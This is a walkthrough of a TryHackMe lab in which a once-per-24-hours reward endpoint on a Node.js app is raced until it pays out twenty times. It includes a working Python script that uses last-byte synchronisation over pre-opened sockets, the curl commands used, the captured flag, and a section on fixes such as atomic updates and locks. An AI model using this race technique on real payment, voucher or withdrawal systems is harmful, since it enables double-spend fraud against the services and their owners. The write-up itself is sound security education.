---
title: TryHackMe Towel on the Sunbed — Racing a Once-a-Day Reward
date: 2026-08-05T10:30:00+05:30
lastmod: 2026-08-05T10:30:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-towel/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web
  - Race Condition
  - Business Logic
  - API Abuse
  - TOCTOU
  - Node.js

draft: false
description: "Walkthrough of the TryHackMe room Towel on the Sunbed — beating a once-per-24h staking reward with a TOCTOU race, and why naive threading loses it."
---

## Towel on the Sunbed

**Day 8 of Hacker Holidays 2026.** The Byte Lotus has a wellness portal, and the wellness portal has a crypto rewards app, because of course it does. The briefing:

> Ponzi found the resort's wellness portal running a little side project called Ponzi — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.

And the line that tells you what the bug is, if you read it carefully:

> He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through.

There's even a hint styled as a social post from `@0xMia`:

> "ponzi guy has been refreshing his dashboard for an HOUR waiting on this timer 💀 bro really thinks the clock is the only thing checking him"

*Between his request and the server's clock.* *The clock is the only thing checking him.* That is a **race condition** described in plain English — a check that happens at one moment and a write that happens at another, with a gap in between.

Category is Web, difficulty Medium, 90 points, tagged Business Logic and API Abuse. Target is `http://<lab-ip>:3000`.

## Step 1: Read the rules before breaking them

The app redirects everything to `/auth/login` and offers `/auth/register`, so I made a guest account and looked at the dashboard. It states its own economics, which is a gift:

![Dashboard text showing Portfolio Balance, Staking Rewards offering 50 PONZI every 24 hours, and a Whale Vault requiring 150 PONZI to unlock, currently at 0 of 150](/img/thm-towel/01-mechanics.png)

- **Earn 50 PONZI every 24 hours** by claiming the staking reward
- **Reach 150 PONZI** to unlock the Whale Vault

Do the arithmetic before touching anything. 150 needed, 50 per claim, one claim per day — **exactly three claims**, which is three days of waiting. That number is the room. It's also the room's title: Ponzi's sunbed got claimed *three times over*.

So the objective isn't "find an injection." It's "make one day's claim pay out three times."

## Step 2: Find the API and confirm the lock actually works

The dashboard is server-rendered but pulls its state from JSON endpoints. One `grep` through its script gives the whole surface:

```bash
grep -nE "fetch|/api/" js/dashboard.js
```

```
 6:  await fetch('/dashboard/api/me')
68:  await fetch('/claim', { method: 'POST' })
87:  await fetch('/vault')
```

Three endpoints, and no client-side cleverness to work around. Before attacking, establish the baseline honestly — you need to know exactly what "working correctly" looks like:

![Terminal showing the three API endpoints, a successful claim returning reward 50, a second claim rejected with secondsRemaining 86399, and the vault denying access with shortfall 100](/img/thm-towel/02-api.png)

```bash
curl -s -b ck.txt -X POST $T/claim
# {"message":"Staking reward claimed successfully.","reward":50,"newBalance":50,"tier":"Shrimp"}

curl -s -b ck.txt -X POST $T/claim          # immediately again
# {"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":86399}

curl -s -b ck.txt $T/vault
# {"error":"Access denied. Whale-tier balance required.","currentBalance":50,"required":150,"shortfall":100}
```

The cooldown works. Sequentially, there is no bug here at all — the second request is correctly refused, and `/dashboard/api/me` shows `canClaim: false` with `secondsUntilClaim: 86399`.

That's the important framing. **This vulnerability does not exist in sequential time.** You can test this endpoint all day, one request after another, and conclude it's solid. It only exists when two requests overlap.

{{< ad >}}

## Step 3: Why the obvious attack fails

The claim handler almost certainly does something shaped like this:

```js
const user = await db.getUser(id);                 // 1. read last_claim
if (Date.now() - user.last_claim < 86400_000)      // 2. check
  return res.json({ error: "Reward already claimed." });
await db.addBalance(id, 50);                       // 3. write
await db.setLastClaim(id, Date.now());
```

Between step 1 and step 4 there is an `await`. In Node that means the handler **yields the event loop** — and any other request that arrived meanwhile gets to run steps 1 and 2 against the *old* `last_claim`. Every one of them concludes it's allowed. That's a TOCTOU (time-of-check to time-of-use) race, and it's why single-threaded JavaScript is not immune to races the way people assume.

So: fire a batch of claims at once. My first attempt was the obvious one — ten threads sharing a `requests.Session`:

![Terminal showing the naive threaded attempt against a fresh account, resulting in only 1 of 10 claims paid out and a final balance of 50](/img/thm-towel/03-naive-fail.png)

```
1/10 claims paid out
final balance=50 tier=Shrimp (need 150)
```

**One.** Worth understanding why, because this is where people give up and wrongly conclude the app is safe:

**A shared `Session` serialises you.** `requests` keeps a connection pool per session, and threads contend for those connections. Requests that look concurrent in your code go out largely one after another.

**WAN jitter smears the arrivals.** The lab was ~200 ms away with round-trips varying by over 100 ms. Even with ten genuinely parallel sockets, they'd land spread across a window far wider than the race itself.

The race window is measured in the time between a database read and a database write — likely under a millisecond. To land inside it you need requests arriving within *microseconds* of each other, and "start ten threads and hope" doesn't get you there.

## Step 4: Make them arrive together

The technique is **last-byte synchronisation** (the idea behind PortSwigger's single-packet attack). Rather than trying to send complete requests simultaneously, you do the slow, jittery work in advance and leave each request one byte short of complete:

1. Open N independent sockets and finish all the TCP handshakes up front.
2. Send each request *except* its final body byte. Declare `Content-Length: 1` and withhold the body. Each request now sits parked in the server's buffer — received, but not yet dispatchable.
3. Release the final byte on all N sockets back-to-back.

All the variable cost — DNS, handshakes, headers, TLS if any — is paid before the starting gun. What's left is one byte per connection, so the requests become dispatchable within a hair's breadth of each other.

```python
head = (
    f"POST /claim HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Cookie: connect.sid={sid}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 1\r\n"          # <- body withheld
    f"Connection: keep-alive\r\n\r\n"
).encode()

socks = []
for _ in range(N):
    s = socket.create_connection((HOST, PORT), timeout=30)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)   # no Nagle batching
    s.sendall(head)
    socks.append(s)

time.sleep(1.0)                       # let every partial request land

barrier = threading.Barrier(N)        # release them together
def finish(i, s):
    barrier.wait()
    s.sendall(b"a")
    replies[i] = s.recv(4096)
```

`TCP_NODELAY` matters: without it, Nagle's algorithm may hold that final byte back waiting to coalesce it with more data. `threading.Barrier` matters because it parks every thread until the last one is ready, so no thread fires early.

Twenty sockets against a fresh account:

![Terminal showing 20 of 20 claims paid out against account whale03, final balance 1000, tier Whale, and the vault returning the flag](/img/thm-towel/04-race-win.png)

```
20/20 claims paid out
final balance=1000 tier=Whale (need 150)

{"message":"Welcome to the Whale Vault.",
 "flag":"THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}","balance":1000}
```

> `THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}`

**Twenty out of twenty.** Every single request read `last_claim` before any of them wrote it, so all twenty paid out — 1000 PONZI from a single day's entitlement, against a 150 threshold.

Worth reporting honestly: my first socket-based run landed **5 of 20**, not 20. Same code, same target, minutes apart. Race exploitation is probabilistic — you're betting on scheduling you don't control — so if a run underperforms, run it again before concluding it failed. Five was already more than the three I needed.

The flag naming it `d0ubl3_sp3nt` is apt. This is structurally the **double-spend** problem: one entitlement, spent many times, because the ledger was read before it was written.

## Why races are the bug class that survives review

Every other Byte Lotus room this week had a mistake you could point at in a diff — an unsafe loader, a password in argv, an exposed `.git`. This one doesn't, and that's what makes it worth studying.

**The code looks correct.** Check-then-act reads like exactly what the requirement says: "if 24 hours have passed, pay out." A reviewer confirms the requirement is implemented, and moves on. There's no dangerous function to grep for.

**Sequential tests all pass.** Unit tests, integration tests, and manual QA all drive one request at a time and see correct refusals. The vulnerability is invisible to every test that doesn't deliberately overlap requests — and almost nobody writes those.

**"Single-threaded so it's safe" is wrong.** Node runs one thread, but `await` is a yield point. Any state read before an `await` may be stale after it. The same trap exists in Python asyncio, Go with unlocked shared state, and any framework doing concurrent database work.

**It's a business-logic bug, so scanners never see it.** There is no payload, no anomalous character, no suspicious string. Every request is perfectly well-formed and individually authorised. Burp's scanner, a WAF, and an IDS all see twenty legitimate claims from a logged-in user. The only thing wrong is *how many* succeeded.

That combination — invisible to review, invisible to sequential tests, invisible to scanners — is why race conditions keep showing up in production payment, voucher, withdrawal and referral flows years after launch.

## Fixing it

The fix is not "add a rate limiter." Rate limiting reduces how often an attacker can *attempt* this, but a burst of twenty simultaneous requests is a single burst — it's exactly what slips under a per-minute limit.

**Make the check and the write one atomic operation.** Let the database decide, with a conditional update whose own `WHERE` clause enforces the rule:

```sql
UPDATE users
   SET balance = balance + 50,
       last_claim = NOW()
 WHERE id = $1
   AND (last_claim IS NULL OR last_claim < NOW() - INTERVAL '24 hours');
```

Then check the affected row count. Exactly one request gets `1`; every other concurrent request gets `0` and is refused. There is no window, because there is no gap between deciding and writing.

**Or take a lock for the duration.** `SELECT ... FOR UPDATE` on the user row inside a transaction serialises concurrent claims. More flexible when the logic is complex, at the cost of holding a row lock.

**Or add a uniqueness constraint that makes the invariant impossible to violate.** A `claims` table with `UNIQUE (user_id, claim_date)` means the second insert fails at the database level no matter how the application code is written. This is my favourite when it fits: it survives future refactors by developers who've never heard of this bug.

**Then test for it.** Add a test that fires N concurrent requests and asserts exactly one succeeds. If your test suite never overlaps requests, it cannot catch this class of bug, and the next one will ship too.

## Room summary

| | |
|---|---|
| Room | Towel on the Sunbed |
| Event | Hacker Holidays 2026 — Day 8 |
| Category | Web · Business Logic · API Abuse |
| Difficulty | Medium · 90 points |
| Target | `http://<lab-ip>:3000` |
| Stack | Node.js / Express (`X-Powered-By: Express`) |
| App | Ponzi — Wellness Rewards |
| Economics | 50 PONZI per claim, 1 claim / 24h, 150 to open the Whale Vault |
| Endpoints | `GET /dashboard/api/me`, `POST /claim`, `GET /vault` |
| Bug | TOCTOU race between the cooldown check and the timestamp write |
| Technique | Last-byte synchronisation across 20 pre-opened sockets |
| Result | 20/20 claims paid — 1000 PONZI against a 150 threshold |
| Flag | `THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}` |

## Wrap-up

The whole room, once you see it:

```bash
curl -s -X POST $T/auth/register -d 'username=whale&password=x'   # fresh account
python3 race2.py 20 whale                                         # 20 sockets, one byte each
curl -s -b ck.txt $T/vault                                        # flag
```

The lesson I'd keep is about **where to look**, not how to fire sockets. Ponzi's app had no injection, no broken authentication, no leaked secret. It had a rule — *once every 24 hours* — and the rule was enforced in two steps instead of one.

So when a target looks clean, stop hunting for payloads and start listing its **rules**: one vote per user, one coupon per order, one withdrawal per balance, one signup bonus per account. Then ask the only question that matters for this bug class: *what happens if I ask twice at exactly the same moment?*

Ponzi waited an hour for a timer that was never really guarding anything. The clock was the only thing checking him — and a clock you read before you write is not a lock. 🪷
